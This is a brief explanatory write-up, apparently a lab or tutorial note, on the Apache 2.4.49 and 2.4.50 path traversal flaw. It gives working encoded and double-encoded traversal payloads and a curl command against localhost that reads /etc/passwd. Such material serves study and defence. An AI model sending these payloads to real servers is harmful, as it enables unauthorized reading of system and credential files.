```Vulnerability
## 🔥 What’s the vulnerability?
In **Apache 2.4.49** and **2.4.50**, **path normalization was flawed**, meaning Apache didn't properly sanitize certain URL-encoded paths. This allowed attackers to:
1. **Read arbitrary files** on the server (**LFI**, Local File Inclusion).
2. **Execute arbitrary code** via CGI scripts if CGI was enabled (**RCE**, Remote Code Execution).
```

```Explanation
### Path Traversal with URL Encoding
Normally, paths like:
```
`/cgi-bin/../../../../etc/passwd`
```
should be blocked because `..` traverses directories.
But if you **encode just one dot** like:
```
`/cgi-bin/.%2e/.%2e/.%2e/etc/passwd`
```
…it bypasses the protection because Apache doesn't correctly decode the `%2e` (which is a `.`).
Even worse:  
In **2.4.50**, Apache tried to fix the bug but **didn’t account for _double-encoding_**:
```
`%%32%65 → %2e → .   ← bypasses the fix`
```
### File Disclosure Exploit (LFI)
If **CGI is _not_ enabled**, you can only **read files** like this:
```
`curl 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'`
